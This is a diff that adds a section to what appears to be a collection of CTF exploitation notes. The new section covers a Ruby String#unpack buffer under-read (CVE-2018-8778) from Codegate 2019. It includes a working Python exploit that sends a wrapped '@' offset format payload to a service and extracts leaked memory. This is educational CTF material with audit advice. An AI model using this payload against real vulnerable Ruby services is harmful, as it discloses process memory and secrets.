@@ -46,6 +46,7 @@ status: archived
 - [4-Byte Shellcode with Timing Side-Channel via Persistent Registers (Google CTF 2017)](#4-byte-shellcode-with-timing-side-channel-via-persistent-registers-google-ctf-2017)
 - [CRC Oracle as Arbitrary Read Primitive (ASIS CTF 2017)](#crc-oracle-as-arbitrary-read-primitive-asis-ctf-2017)
 - [UTF-8 Case Conversion Buffer Overflow (HITB CTF 2017)](#utf-8-case-conversion-buffer-overflow-hitb-ctf-2017)
+- [Ruby String#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)](#ruby-stringunpack-buffer-under-read-cve-2018-8778-codegate-2019)
 
 ---
 
@@ -629,6 +630,48 @@ payload = b"\xd6\x87" * 68 + b"$0;".ljust(8, b" ") + p32(0x400890)
 **When to recognize:** Binary performs Unicode case conversion (upper/lower) on user input before copying to a fixed-size buffer. Look for GLib, ICU, or custom UTF-8 processing functions. The overflow ratio depends on the specific characters used.
 
 **参考：** HITB CTF 2017
+
+---
+
+## Ruby String#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)
+
+**模式（mini converter）：** A Ruby service interpolates attacker-controlled input into a `String#unpack` format. The `@N` directive moves the read cursor to an absolute offset and `C<count>` emits bytes. On a vulnerable Ruby runtime, a huge wrapped offset can make `String#unpack` read before the string buffer and disclose process memory.
+
+The exploit requires both conditions:
+
+1. user input controls or is interpolated into the unpack format string;
+2. the runtime is vulnerable to CVE-2018-8778.
+
+```python
+import re
+import socket
+import string
+
+# Challenge-specific 64-bit wraparound offset followed by a byte count.
+payload = b'@18446744073708351616C1200000\n1\n'
+
+with socket.create_connection(('target', 12137)) as sock:
+    sock.sendall(payload)
+    chunks = []
+    while True:
+        chunk = sock.recv(4096)
+        if not chunk:
+            break
+        chunks.append(chunk)
+
+lines = b''.join(chunks).decode(errors='ignore').splitlines()
+leak = ''.join(chr(int(line)) for line in lines
+               if line.strip().isdigit()
+               and 0 <= int(line) <= 255
+               and chr(int(line)) in string.printable)
+print(re.findall(r'[A-Za-z0-9_]+\{[^}]*\}', leak))
+```
+
+`String#unpack` is not inherently unsafe. The exploitable pattern is attacker-controlled format syntax combined with the vulnerable cursor arithmetic. Audit interpolation into `unpack`, `pack` and `sprintf` templates just as you would a format-string sink, and turn the disclosure into a bounded read primitive before searching for secrets.
+
+The affected method is `String#unpack`. Ruby released fixes in 2.5.1, 2.4.4, 2.3.7 and 2.2.10; check the exact branch rather than summarizing the condition as only “pre-2.5.1”.
+
+**参考：** Codegate CTF 2019 Preliminary — mini converter；Ruby 官方安全公告：<https://www.ruby-lang.org/en/security/>。
 
 ---
 
